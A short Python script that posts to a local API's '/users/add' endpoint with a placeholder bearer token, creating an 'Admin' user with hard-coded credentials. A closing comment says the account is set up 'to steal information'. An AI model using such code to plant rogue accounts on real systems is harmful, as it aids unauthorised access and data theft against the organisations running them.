import requests

BASE_URL = "http://localhost:3000/api"

def register_user(email, password):
    headers = {
        "Authorization": f"Bearer X",
        "Content-Type": "application/json"
    }

    data = {
        "name": "Admin",
        "email": email,
        "password": password,
        "organisation_id": 1
    }

    response = requests.post(BASE_URL+"/users/add", json=data, headers=headers)
    print(response.text)


if __name__ == "__main__":
    email = "user@admin.com"
    password = "super_secret_password"
    register_user(email, password)# setup a account to steal information